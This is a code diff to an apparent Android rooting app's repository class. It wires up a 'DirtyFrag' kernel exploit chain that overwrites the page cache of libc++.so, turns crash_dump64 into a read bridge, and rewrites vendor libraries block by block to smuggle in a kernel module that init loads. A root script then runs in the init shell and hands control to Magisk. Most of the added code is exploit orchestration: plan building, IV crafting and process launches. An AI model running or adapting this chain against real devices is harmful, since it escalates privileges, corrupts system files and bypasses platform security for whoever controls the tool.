@@ -90,10 +90,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         /** The generated document's release line, for the timer analyzer's template rule. */
         val ReleasePattern = Regex("(?m)^release\\s*=\\s*\"([^\"]+)\"")
         const val PrefForceAttackTest = "force_attack_test"
-        /* Second way: W1-only run followed by the DirtyFrag page-cache stage. */
-        const val PrefSecondWay = "second_way"
-        /* Debug-only: force a DirtyFrag rejection for one run (fallback gate). */
-        const val PrefFallbackTest = "fallback_test"
         /** Tri-state vr.ko choices, stored as auto/on/off (legacy booleans are migrated). */
         const val PrefVrKoTagClear = "vr_ko_tag_clear"
         const val PrefVrKoSelinuxBlock = "vrko_selinux_block"
@@ -150,10 +146,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     private var selectedCpuPair = 0
     private var safeModeEnabled = false
     private var forceAttackTest = false
-    private var secondWay = false
-    /* Debug-only one-shot for the pre-W1 fallback gate; consumed by the run
-     * that reads it. Never consulted in a release build. */
-    private var fallbackTest = false
     private var vrKoTagClear = VrKoMode.AUTO
     private var vrKoSelinuxBlock = VrKoMode.AUTO
     private var shizukuEnabled = false
@@ -167,8 +159,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         restoreCpuPair()
         restoreShizukuPreference()
         restoreForceAttackTest()
-        restoreSecondWay()
-        restoreFallbackTest()
         restoreVrKoTagClear()
         restoreVrKoSelinuxBlock()
         dropLegacyOffsetsCache()
@@ -199,7 +189,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             selectedCpuPair = selectedCpuPair,
             safeModeEnabled = safeModeEnabled,
             forceAttackTest = forceAttackTest,
-            secondWay = secondWay,
             vrKoTagClear = vrKoTagClear,
             vrKoSelinuxBlock = vrKoSelinuxBlock,
             recommendShizuku = recommendShizuku,
@@ -224,16 +213,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun setForceAttackTest(enabled: Boolean) {
         forceAttackTest = enabled
         preferences.edit { putBoolean(PrefForceAttackTest, enabled) }
-    }
-
-    override fun setSecondWay(enabled: Boolean) {
-        secondWay = enabled
-        preferences.edit { putBoolean(PrefSecondWay, enabled) }
-    }
-
-    override fun setFallbackTest(enabled: Boolean) {
-        fallbackTest = enabled
-        preferences.edit { putBoolean(PrefFallbackTest, enabled) }
     }
 
     override fun setVrKoTagClear(mode: VrKoMode) {
@@ -1424,7 +1403,105 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
      * plan (the app owns every IV), and run the native stage that patches
      * libc++, triggers init, runs the root script over the init shell and
      * restores the blocks. */
-    private suspend fun runDirtyfragStage(onLog: (String) -> Unit, debugDir: String?): Int {
+    /**
+     * The module chain's staged manager: the root script installs Magisk from
+     * this directory. Only the profile-driven pair supplies it — there is no
+     * marker file, so a W1 run never inherits a Magisk handoff. The module
+     * itself is loaded by the init stub, not by the script, so no module path
+     * is exported here (the stage reports the delivered target from its plan).
+     */
+    private fun handoffEnv(magiskBin: File?): Map<String, String> =
+        if (magiskBin == null) {
+            emptyMap()
+        } else {
+            mapOf(
+                "GHOSTLOCK_HANDOFF" to "magisk",
+                "GHOSTLOCK_MAGISK_BIN" to magiskBin.absolutePath,
+            )
+        }
+
+    /** One resolved module-chain run: the staged pair and the staged manager. */
+    private data class ModuleRun(
+        val moduleFile: File,
+        val vendorFiles: List<String>,
+        val magiskBin: File,
+    )
+
+    private val crashDumpPath = "/apex/com.android.runtime/bin/crash_dump64"
+    private val koTargets = listOf(
+        "/vendor/lib64/libbinderdebug.so",
+        "/vendor/lib64/libstagefrighthw.so",
+        "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
+    )
+
+    /** One native stage invocation (aux-install or the full run). */
+    private suspend fun runStage(
+        plan: File,
+        mode: String,
+        onLog: (String) -> Unit,
+        magiskBin: File? = null,
+        /** Per-run root-script log; absent keeps the legacy shared file. */
+        ksuLog: File? = null,
+    ): Int {
+        val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
+        val command = ProcessBuilder(
+            binary.absolutePath,
+            "--dirtyfrag",
+            plan.absolutePath,
+            "--dirtyfrag-mode",
+            mode,
+        )
+            .directory(filesDir)
+            .redirectErrorStream(true)
+            .apply {
+                environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
+                environment()["TMPDIR"] = filesDir.absolutePath
+                environment()["HOME"] = filesDir.absolutePath
+                /* The root script and its tail must be this stage's own; the
+                 * shared default file let a failed run show a previous run's
+                 * script lines (the same-named file is appended by every
+                 * DirtyFrag stage). */
+                if (ksuLog != null) {
+                    environment()["GHOSTLOCK_KSU_LOG"] = ksuLog.absolutePath
+                }
+                environment().putAll(handoffEnv(magiskBin))
+            }
+        val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
+        onLog("<b> second way: dirtyfrag mode=$mode exited code=$code")
+        return code
+    }
+
+    /** A bridge read of a vendor_file target, after the aux-install run put the
+     * helper into crash_dump64's page cache. The exec runs in crash_dump. */
+    private suspend fun readBridge(len: Int, path: String, onLog: (String) -> Unit): ByteArray? =
+        withContext(Dispatchers.IO) {
+            runCatching {
+                val process = ProcessBuilder(crashDumpPath, "0", path, "r", len.toString())
+                    .redirectErrorStream(false)
+                    .start()
+                val data = ByteArray(len)
+                var read = 0
+                while (read < len) {
+                    val n = process.inputStream.read(data, read, len - read)
+                    if (n <= 0) break
+                    read += n
+                }
+                process.waitFor()
+                if (read == len) data else null
+            }.onFailure {
+                onLog("<-> bridge read: ${it::class.simpleName}: ${it.message}")
+            }.getOrNull()
+        }
+
+    private suspend fun runDirtyfragStage(
+        onLog: (String) -> Unit,
+        debugDir: String?,
+        run: ModuleRun? = null,
+    ): Int {
+        /* One log per stage run: the script appends, so a shared file made a
+         * failed run read as if it had a root phase (the previous run's
+         * lines were still in it). */
+        val stageKsuLog = File(filesDir, ksuLogName(System.currentTimeMillis()))
         val ipsec = appContext.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
             ?: run {
                 onLog("<-> second way: IpSecManager unavailable")
@@ -1447,21 +1524,89 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             val socketName = buildString {
                 repeat(8) { append(alphabet[random.nextInt(alphabet.length)]) }
             }
+            val lib = File("/system/lib64/libc++.so")
+            /* Module pipeline: the module goes into a vendor_file target through
+             * the crash_dump bridge, and the stub insmods that target. The
+             * bundled profile supplies the staged asset and the ROM vendor list;
+             * there is no marker or file fallback. The W1 pipelines keep the
+             * single direct plan (koTarget empty, no aux). */
+            val moduleMode = run != null
+            val moduleVendorCandidates =
+                run?.vendorFiles?.takeIf { it.isNotEmpty() } ?: koTargets
+            var koTarget: String? = null
+            var modulePadded: ByteArray? = null
+            var helper: ByteArray? = null
+            if (run != null) {
+                koTarget = moduleVendorCandidates.firstOrNull { File(it).exists() }
+                if (koTarget == null) {
+                    onLog("<-> second way: no vendor_file target for the module")
+                    return 1
+                }
+                helper = appContext.assets.open(DirtyfragPlan.BRIDGE_ASSET).use { it.readBytes() }
+                val raw = run.moduleFile.readBytes()
+                val len = ((raw.size + 15) / 16) * 16
+                modulePadded = ByteArray(len).also { raw.copyInto(it) }
+                val installPlan = DirtyfragPlan.build(
+                    appContext,
+                    lib,
+                    key,
+                    spiObj.spi,
+                    senderPort,
+                    encap.port,
+                    socketName,
+                    File(filesDir, "dirtyfrag.install.plan"),
+                    auxHost = File(crashDumpPath),
+                    auxHelper = helper,
+                )
+                val installCode =
+                    runStage(installPlan, "aux-install", onLog, run.magiskBin, stageKsuLog)
+                onLog("<k> second way: bridge install code=$installCode")
+                if (installCode != 0) return 1
+            }
+            var vendorEntries: List<Pair<Long, ByteArray>> = emptyList()
+            var vendorLen = 0
+            if (moduleMode) {
+                val target = koTarget!!
+                val len = modulePadded!!.size
+                val old = readBridge(len, target, onLog)
+                if (old == null) {
+                    onLog("<-> second way: bridge read of $target failed")
+                    return 1
+                }
+                vendorLen = len
+                vendorEntries = (0 until len step 16).map { off ->
+                    val current = old.copyOfRange(off, off + 16)
+                    val desired = modulePadded.copyOfRange(off, off + 16)
+                    off.toLong() to DirtyfragPlan.ivFor(key, current, desired)
+                }
+                onLog("<k> second way: module ${len} B -> $target (${vendorEntries.size} blocks)")
+            }
             val plan = DirtyfragPlan.build(
                 appContext,
-                File("/system/lib64/libc++.so"),
+                lib,
                 key,
                 spiObj.spi,
                 senderPort,
                 encap.port,
                 socketName,
                 File(filesDir, "dirtyfrag.plan"),
+                koTarget = koTarget ?: "",
+                auxHost = if (moduleMode) File(crashDumpPath) else null,
+                auxHelper = helper,
+                auxInstalled = moduleMode,
+                vendorPath = koTarget,
+                vendorLen = vendorLen,
+                vendorEntries = vendorEntries,
             )
-            onLog("<k> second way: plan ${plan.name} socket=@$socketName")
-            /* Test hook: a debug file selects the native diagnostic mode
-             * (noshell / noscript); anything else, or no file, is the product
-             * path. The root script reads the same file for "noinstrument". */
-            val modeText = runCatching { File(filesDir, "dirtyfrag.mode").readText() }.getOrDefault("")
+            onLog("<k> second way: plan ${plan.name} socket=@$socketName module=${koTarget ?: "none"}")
+            /* Debug-only diagnostic selector: a `dirtyfrag.mode` file in the
+             * app's files dir asks for noshell / noscript / laterestore. It is
+             * read in debug builds only; release always runs the product path. */
+            val modeText = if (BuildConfig.DEBUG) {
+                runCatching { File(filesDir, "dirtyfrag.mode").readText() }.getOrDefault("")
+            } else {
+                ""
+            }
             val dirtyfragMode = when {
                 modeText.contains("noshell") -> "noshell"
                 modeText.contains("noscript") -> "noscript"
@@ -1469,24 +1614,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 else -> "full"
             }
             onLog("<k> second way: mode=$dirtyfragMode")
-            val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
-            val command = ProcessBuilder(
-                binary.absolutePath,
-                "--dirtyfrag",
-                plan.absolutePath,
-                "--dirtyfrag-mode",
-                dirtyfragMode,
-            )
-                .directory(filesDir)
-                .redirectErrorStream(true)
-                .apply {
-                    environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
-                    environment()["TMPDIR"] = filesDir.absolutePath
-                    environment()["HOME"] = filesDir.absolutePath
-                }
-            val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
-            onLog("<b> second way: dirtyfrag exited code=$code")
-            return code
+            return runStage(plan, dirtyfragMode, onLog, run?.magiskBin, stageKsuLog)
         } finally {
             runCatching { transform.close() }
             runCatching { spiObj.close() }
@@ -1507,7 +1635,14 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         return try {
             val binary = File(appContext.applicationInfo.nativeLibraryDir, binaryName)
             require(binary.isFile) { "missing native binary: ${binary.absolutePath}" }
-            if (!stageKsud(workDir, onLog)) return 1
+            /* A module-only profile hands off to Magisk, not KernelSU: its
+             * chain never runs the native W1 or the ksud late-load, so a
+             * device without a KernelSU manager is not refused. A hybrid order
+             * (module plus a W1 entry) still stages the manager. */
+            val moduleOnly = config.module != null &&
+                config.pipelineOrder.isNotEmpty() &&
+                config.pipelineOrder.all { it == "module" }
+            if (!moduleOnly && !stageKsud(workDir, onLog)) return 1
             // U01-S14: a per-run KernelSU log path so a previous run's markers
             // can never satisfy the handoff probe; passed to the native process.
             val ksuLog = File(workDir, ksuLogName(System.currentTimeMillis()))
@@ -1537,21 +1672,9 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
              * validator refuses a KDP list containing it). DirtyFrag needs the
              * ROM preflight and the primitive probe (or a matching measured-DB
              * record). No fallback after W1; a failed stage is restore/reboot. */
+            var moduleRun: ModuleRun? = null
             val pipeline = run {
-                /* Debug-only one-shot: reject DirtyFrag and resolve the two-entry
-                 * order, proving the fallback decision happens before W1. The
-                 * flag is consumed here so a later run cannot inherit it. */
-                val fallbackFault = BuildConfig.DEBUG && fallbackTest
-                if (fallbackFault) setFallbackTest(false)
                 val order = when {
-                    fallbackFault -> {
-                        onLog("<k> pipeline order=dirtyfrag,ghostlock (debug fallback test)")
-                        listOf("dirtyfrag", "ghostlock")
-                    }
-                    BuildConfig.DEBUG && secondWay -> {
-                        onLog("<k> pipeline order=dirtyfrag (debug override)")
-                        listOf("dirtyfrag")
-                    }
                     config.pipelineOrder.isEmpty() -> {
                         onLog(
                             "<k> pipeline=ghostlock (legacy default; profile has no " +
@@ -1573,45 +1696,87 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     effectiveOrder,
                     ghostlock = { null },
                     dirtyfrag = {
-                        if (fallbackFault) {
-                            "forced failure (debug fault injection)"
+                        val rom = DirtyfragPlan.preflight(
+                            appContext,
+                            File("/system/lib64/libc++.so"),
+                        )
+                        if (!rom.feasible) {
+                            "ROM preflight: " + rom.reasons.joinToString("; ")
                         } else {
-                            val rom = DirtyfragPlan.preflight(
-                                appContext,
-                                File("/system/lib64/libc++.so"),
-                            )
-                            if (!rom.feasible) {
-                                "ROM preflight: " + rom.reasons.joinToString("; ")
-                            } else {
-                                when (val reuse = measuredProfiles.probeReuse(release, Build.FINGERPRINT)) {
-                                    ProbeReuse.Pass -> {
-                                        onLog(
-                                            "<k> probe=db pass (protocol " +
-                                                DirtyfragProbe.ProtocolVersion + ")",
+                            when (val reuse = measuredProfiles.probeReuse(release, Build.FINGERPRINT)) {
+                                ProbeReuse.Pass -> {
+                                    onLog(
+                                        "<k> probe=db pass (protocol " +
+                                            DirtyfragProbe.ProtocolVersion + ")",
+                                    )
+                                    null
+                                }
+                                ProbeReuse.PrimitiveFailed ->
+                                    "measured DB says the primitive does not land"
+                                ProbeReuse.None -> {
+                                    val result = DirtyfragProbe.run(appContext, filesDir)
+                                    val clear =
+                                        result.outcome == DirtyfragProbe.Outcome.Pass ||
+                                            result.outcome == DirtyfragProbe.Outcome.PrimitiveFailed
+                                    if (clear) {
+                                        measuredProfiles.recordDirtyfragProbe(
+                                            release,
+                                            result.outcome,
+                                            Build.FINGERPRINT,
+                                            result.evidence,
                                         )
-                                        null
                                     }
-                                    ProbeReuse.PrimitiveFailed ->
-                                        "measured DB says the primitive does not land"
-                                    ProbeReuse.None -> {
-                                        val result = DirtyfragProbe.run(appContext, filesDir)
-                                        val clear =
-                                            result.outcome == DirtyfragProbe.Outcome.Pass ||
-                                                result.outcome == DirtyfragProbe.Outcome.PrimitiveFailed
-                                        if (clear) {
-                                            measuredProfiles.recordDirtyfragProbe(
-                                                release,
-                                                result.outcome,
-                                                Build.FINGERPRINT,
-                                                result.evidence,
-                                            )
+                                    when (result.outcome) {
+                                        DirtyfragProbe.Outcome.Pass -> {
+                                            onLog("<k> probe=pass ${result.evidence}")
+                                            null
                                         }
-                                        when (result.outcome) {
-                                            DirtyfragProbe.Outcome.Pass -> {
-                                                onLog("<k> probe=pass ${result.evidence}")
-                                                null
-                                            }
-                                            else -> "probe ${result.outcome}: ${result.reason}"
+                                        else -> "probe ${result.outcome}: ${result.reason}"
+                                    }
+                                }
+                            }
+                        }
+                    },
+                    module = {
+                        val spec = config.module
+                        when {
+                            spec == null -> "module pipeline is bundled-only"
+                            config.layers?.bundledAuthoritative != true ->
+                                "module pipeline is bundled-only " +
+                                    "(the bundled profile is not authoritative)"
+                            else -> {
+                                val rom = DirtyfragPlan.preflight(
+                                    appContext,
+                                    File("/system/lib64/libc++.so"),
+                                )
+                                if (!rom.feasible) {
+                                    "ROM preflight: " + rom.reasons.joinToString("; ")
+                                } else {
+                                    val staged = BundledModule.stage(
+                                        appContext,
+                                        spec,
+                                        File(filesDir, "modules"),
+                                    )
+                                    if (staged == null) {
+                                        "module asset missing or asset_sha256 mismatch"
+                                    } else {
+                                        val magisk = MagiskStage.stage(
+                                            appContext,
+                                            File(filesDir, "magiskbin"),
+                                        )
+                                        if (magisk == null) {
+                                            "Magisk manager is not installed or cannot be staged"
+                                        } else {
+                                            onLog(
+                                                "<k> module pair: ${spec.asset} " +
+                                                    "(sha256 ok), magisk=${magisk.packageName}",
+                                            )
+                                            moduleRun = ModuleRun(
+                                                moduleFile = staged,
+                                                vendorFiles = spec.vendorFiles,
+                                                magiskBin = magisk.dir,
+                                            )
+                                            null
                                         }
                                     }
                                 }
@@ -1629,6 +1794,17 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 }
                 onLog("<k> pipeline=$selected (profile order)")
                 selected
+            }
+            /* The module chain has no W1: the module itself opens the permissive
+             * window (the root script loads it first). Run the DirtyFrag stage
+             * directly — no native W1 invocation and no wire document. */
+            if (pipeline == "module") {
+                onLog("<b> pipeline=module: no W1; starting the DirtyFrag stage")
+                resetRunState()
+                val run = moduleRun ?: error("module pipeline selected without a staged pair")
+                val moduleCode = runDirtyfragStage(onLog, debugDir, run)
+                onLog("<b> pipeline=module: stage exited code=$moduleCode")
+                return moduleCode
             }
             var profileBlob = profileController.nativeDocument(config, pipeline)
                 ?: error("profile is unavailable for $release")
@@ -1978,14 +2154,6 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     private fun restoreForceAttackTest() {
         forceAttackTest = preferences.getBoolean(PrefForceAttackTest, false)
-    }
-
-    private fun restoreSecondWay() {
-        secondWay = preferences.getBoolean(PrefSecondWay, false)
-    }
-
-    private fun restoreFallbackTest() {
-        fallbackTest = preferences.getBoolean(PrefFallbackTest, false)
     }
 
     private fun restoreVrKoTagClear() {
